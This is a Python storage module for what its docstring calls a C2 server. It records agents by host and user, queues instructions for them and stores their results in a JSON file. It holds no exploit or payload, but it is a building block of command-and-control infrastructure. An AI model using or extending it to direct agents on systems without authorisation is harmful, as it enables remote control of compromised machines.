"""
Storage module for C2 server - handles persistent JSON storage of agent data.
"""
import json
import threading
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any


class AgentStorage:
    """Thread-safe storage for agent data using JSON files."""

    CONFIG_KEY = "__config__"
    DEFAULT_INSTRUCTION = "Awaiting instructions..."

    def __init__(self, storage_file: str = "agents.json"):
        self.storage_file = Path(storage_file)
        self.lock = threading.Lock()
        self._ensure_storage_exists()

    def _ensure_storage_exists(self):
        """Create storage file if it doesn't exist."""
        if not self.storage_file.exists():
            self._write_data({})

    def _read_data(self) -> Dict:
        """Read data from JSON file."""
        with self.lock:
            try:
                with open(self.storage_file, 'r') as f:
                    return json.load(f)
            except (json.JSONDecodeError, FileNotFoundError):
                return {}

    def _write_data(self, data: Dict):
        """Write data to JSON file."""
        with self.lock:
            with open(self.storage_file, 'w') as f:
                json.dump(data, f, indent=2)

    def create_agent(self, uuid: str, profile: Dict[str, str]) -> Dict:
        """Create a new agent entry with profile information."""
        data = self._read_data()

        # Check if agent already exists
        if uuid in data:
            # Update last_seen and return existing agent
            data[uuid]["last_seen"] = datetime.utcnow().isoformat()
            self._write_data(data)
            return data[uuid]

        now = datetime.utcnow().isoformat()
        default_instructions = self.get_default_instructions()

        # Build instruction history
        instruction_history = []
        if default_instructions != self.DEFAULT_INSTRUCTION:
            # Add default instructions to history
            instruction_history.append({
                "instructions": default_instructions,
                "timestamp": now,
                "replaced": False
            })

        agent = {
            "uuid": uuid,
            "profile": profile,
            "first_seen": now,
            "last_seen": now,
            "current_instructions": default_instructions,
            "instruction_history": instruction_history,
            "result_history": []
        }

        data[uuid] = agent
        self._write_data(data)
        return agent

    def get_agent(self, uuid: str) -> Optional[Dict]:
        """Get agent data by UUID."""
        data = self._read_data()
        return data.get(uuid)

    def get_all_agents(self) -> Dict[str, Dict]:
        """Get all agents (excluding config)."""
        data = self._read_data()
        # Filter out config key
        return {k: v for k, v in data.items() if k != self.CONFIG_KEY}

    def find_agent_by_profile_string(self, profile_string: str) -> Optional[Dict]:
        """Find agent by profile string (username@hostname or username@hostname:process)."""
        agents = self.get_all_agents()

        # Check if profile_string includes process (contains colon after @)
        has_process = ':' in profile_string.split('@')[-1] if '@' in profile_string else False

        for agent in agents.values():
            if 'profile' in agent:
                profile = agent['profile']

                if has_process:
                    # Match with process: username@hostname:process
                    agent_profile_string = f"{profile.get('username', '')}@{profile.get('hostname', '')}:{profile.get('process', '')}"
                else:
                    # Match without process: username@hostname
                    agent_profile_string = f"{profile.get('username', '')}@{profile.get('hostname', '')}"

                if agent_profile_string == profile_string:
                    return agent
        return None

    def update_last_seen(self, uuid: str):
        """Update the last_seen timestamp for an agent."""
        data = self._read_data()
        if uuid in data:
            data[uuid]["last_seen"] = datetime.utcnow().isoformat()
            self._write_data(data)

    def set_instructions(self, uuid: str, instructions: str) -> bool:
        """Set new instructions for an agent, preserving old ones in history."""
        data = self._read_data()

        if uuid not in data:
            return False

        agent = data[uuid]

        # Save current instructions to history
        if agent["current_instructions"] != "Awaiting instructions...":
            agent["instruction_history"].append({
                "instructions": agent["current_instructions"],
                "timestamp": datetime.utcnow().isoformat(),
                "replaced": True
            })

        # Set new instructions
        agent["current_instructions"] = instructions
        agent["instruction_history"].append({
            "instructions": instructions,
            "timestamp": datetime.utcnow().isoformat(),
            "replaced": False
        })

        self._write_data(data)
        return True

    def get_instructions(self, uuid: str) -> Optional[str]:
        """Get current instructions for an agent."""
        agent = self.get_agent(uuid)
        if agent:
            self.update_last_seen(uuid)
            return agent["current_instructions"]
        return None

    def add_result(self, uuid: str, result: Dict[str, Any]) -> bool:
        """Add a result from an agent."""
        data = self._read_data()

        if uuid not in data:
            return False

        # Ensure timestamp is present
        if "timestamp" not in result:
            result["timestamp"] = datetime.utcnow().isoformat()

        data[uuid]["result_history"].append(result)
        self.update_last_seen(uuid)
        self._write_data(data)
        return True

    def get_history(self, uuid: str) -> Optional[Dict[str, List]]:
        """Get instruction and result history for an agent."""
        agent = self.get_agent(uuid)
        if agent:
            return {
                "instruction_history": agent.get("instruction_history", []),
                "result_history": agent.get("result_history", [])
            }
        return None

    def get_default_instructions(self) -> str:
        """Get the default instructions for new agents."""
        data = self._read_data()
        config = data.get(self.CONFIG_KEY, {})
        return config.get("default_instructions", self.DEFAULT_INSTRUCTION)

    def set_default_instructions(self, instructions: str):
        """Set the default instructions for new agents."""
        data = self._read_data()

        if self.CONFIG_KEY not in data:
            data[self.CONFIG_KEY] = {}

        data[self.CONFIG_KEY]["default_instructions"] = instructions
        data[self.CONFIG_KEY]["last_updated"] = datetime.utcnow().isoformat()

        self._write_data(data)

    def clear_default_instructions(self):
        """Reset default instructions to the built-in default."""
        data = self._read_data()

        if self.CONFIG_KEY in data:
            if "default_instructions" in data[self.CONFIG_KEY]:
                del data[self.CONFIG_KEY]["default_instructions"]
            # Clean up empty config
            if not data[self.CONFIG_KEY]:
                del data[self.CONFIG_KEY]
            self._write_data(data)

    def get_show_prelude(self) -> bool:
        """Get the show_prelude setting."""
        data = self._read_data()
        config = data.get(self.CONFIG_KEY, {})
        return config.get("show_prelude", False)

    def set_show_prelude(self, value: bool):
        """Set the show_prelude setting."""
        data = self._read_data()

        if self.CONFIG_KEY not in data:
            data[self.CONFIG_KEY] = {}

        data[self.CONFIG_KEY]["show_prelude"] = value

        self._write_data(data)
